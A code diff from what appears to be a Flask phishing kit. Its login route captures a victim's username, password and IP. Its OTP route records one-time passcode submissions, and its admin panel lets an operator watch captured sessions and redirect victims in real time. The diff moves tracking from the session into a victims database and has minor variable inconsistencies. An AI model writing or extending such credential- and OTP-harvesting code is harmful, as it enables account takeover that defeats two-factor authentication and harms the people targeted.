@@ -80,9 +80,16 @@ def do_login():
     pw = request.form.get("password")
     ip = get_client_ip()
     
-    session["target_username"] = user 
-    session["target_password"] = pw
-    session["target_ip"] = ip
+    sessions_db[uid] = {
+        "status": "credentials_submitted",
+        "redirect_url": None,
+        "username": username,
+        "ip": ip,
+        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "otp_submitted": False,
+        "otp_time": None,
+        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+    }
 
     if "uid" not in session:
         session["uid"] = str(uuid.uuid4())
@@ -146,7 +153,9 @@ def submit_otp():
     
     if uid in sessions_db:
         sessions_db[uid]["status"] = "waiting_otp_verification"
-        sessions_db[uid]["redirect_url"] = None 
+        sessions_db[uid]["redirect_url"] = None
+        sessions_db[uid]["otp_submitted"] = True
+        sessions_db[uid]["otp_time"] = datetime.now().strftime("%H:%M:%S")
         
     return jsonify({"status": "success"})
 
@@ -159,7 +168,7 @@ def success_page():
 @app.route("/admin")
 @admin_required
 def admin_panel():
-    return render_template("admin.html", sessions=sessions_db, user=session.get("target_username"), pw=session.get("target_password"), ip=session.get("target_ip"), code = session.get("target_code"))
+    return render_template("admin.html", sessions=sessions_db)
 
 @app.route("/admin/redirect/<uid>/<path:target>")
 @admin_required
